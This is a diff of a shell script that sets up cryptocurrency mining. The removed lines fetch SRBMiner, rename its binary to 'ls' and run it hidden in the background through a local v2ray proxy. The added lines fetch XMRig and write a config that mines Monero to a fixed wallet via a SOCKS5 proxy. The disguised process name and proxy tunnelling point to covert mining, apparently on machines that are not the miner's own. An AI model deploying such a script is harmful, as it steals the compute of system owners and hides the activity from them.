@@ -41,13 +41,36 @@ EOL
 
 nohup ./v2ray run > v2ray.log 2>&1 &
 cd ~/
-rm -rf SR*
-rm -rf ls
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.8.8/SRBMiner-Multi-2-8-8-Linux.tar.gz
-tar zxfv SRBMiner-Multi-2-8-8-Linux.tar.gz
-mv SRBMiner-Multi-2-8-8 ls
-cd ls
-mv SRBMiner-MULTI ls
-chmod +x ls
-rm -f SR*
-nohup ./ls -o verus.farm:9998  -u RWajjUzHh2BdpLB6qJChgQy2j3SfVXonMK -a verushash --proxy 127.0.0.1:1080 --tls true > ls.log 2>&1 &
+rm -rf xmr*
+wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+tar zxfv xmrig-6.22.2-linux-static-x64.tar.gz
+cd /home/corn/xmrig-6.22.2
+cat > config.json<<EOL
+{
+    "autosave": true,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+  "pools": [
+        {
+            "algo": "rx/0",
+            "coin": null,
+            "url": "pool.supportxmr.com:443",
+            "user": "43cx2hYimLw9YkAYxLG8Vg2TStTL3r6XmbfDfBiCY9MCViYCCaYpEzr1BUCmZTquQwLpg7Sb1FhrV4qR5EXWwvkgKdSHVLd",
+            "pass": "z",
+            "rig-id": null,
+            "nicehash": false,
+            "keepalive": false,
+            "enabled": true,
+            "tls": true,
+            "sni": false,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": "127.0.0.1:1080",
+            "self-select": null,
+            "submit-to-origin": false
+       }
+    ]
+}
+EOL
+./xmrig
